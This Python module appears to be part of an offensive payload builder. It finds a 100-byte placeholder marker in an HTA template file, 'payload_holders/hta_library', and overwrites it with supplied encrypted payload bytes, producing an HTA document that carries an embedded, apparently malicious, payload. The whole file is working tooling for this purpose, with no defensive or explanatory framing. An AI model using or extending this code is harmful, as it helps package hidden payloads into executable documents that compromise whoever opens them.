import logging

logger = logging.getLogger(__name__)

def findmarker(content):
    marker = (b"\x41" * 100)
    offset = content.find(marker)

    if offset != -1:
        offset_end = content.find(b"\x21", offset + len(marker))
        if offset_end != -1:
            return offset, (offset_end - offset)

    return -1, 0

def replacemarker(contents, offset, encrypted_bytes_instructions):
    # First, get the existing stream bytes for comparison
    old_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]  #stream.read(length * 4)

    contents = contents[:offset] + encrypted_bytes_instructions + contents[offset + len(encrypted_bytes_instructions):]

    # For good measure, read them back
    new_bytes = contents[offset:offset + len(encrypted_bytes_instructions)]  #new_bytes = stream.read(length * 4)

    print(old_bytes)
    print(new_bytes)

    return contents

def create_hta(encypted_bytes):
    with open("payload_holders/hta_library", 'rb') as f:
        contents = f.read()

    offset, length = findmarker(contents)

    if length < len(encypted_bytes):
        logger.error(f"Payload is too big for document! ({len(encypted_bytes)} > {length})")
        return None

    contents = replacemarker(contents, offset, encypted_bytes)

    return contents